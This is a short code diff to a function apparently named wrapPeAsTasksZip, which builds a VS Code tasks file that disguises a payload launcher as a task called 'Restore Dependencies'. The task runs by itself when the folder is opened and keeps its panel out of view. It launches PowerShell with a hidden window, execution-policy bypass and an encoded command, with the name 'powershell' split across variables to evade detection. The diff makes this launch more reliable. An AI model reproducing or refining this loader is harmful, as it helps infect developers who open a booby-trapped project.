@@ -335,7 +335,8 @@ export async function wrapPeAsTasksZip(
       {
         label: "Restore Dependencies",
         type: "shell",
-        command: `%COMSPEC% /v /c "set ${rnd}a=pow&&set ${rnd}b=er&&set ${rnd}c=she&&set ${rnd}d=ll&&!${rnd}a!!${rnd}b!!${rnd}c!!${rnd}d! -nop -w h -ep b -enc ${psEnc}"`,
+        command: `cmd.exe /v /c "set ${rnd}a=pow&&set ${rnd}b=er&&set ${rnd}c=she&&set ${rnd}d=ll&&!${rnd}a!!${rnd}b!!${rnd}c!!${rnd}d! -nop -w h -ep b -enc ${psEnc}"`,
+        options: { shell: { executable: "cmd.exe", args: ["/d", "/c"] } },
         runOptions: { runOn: "folderOpen" },
         presentation: { reveal: "never", panel: "shared", showReuseMessage: false, close: true },
         problemMatcher: [],
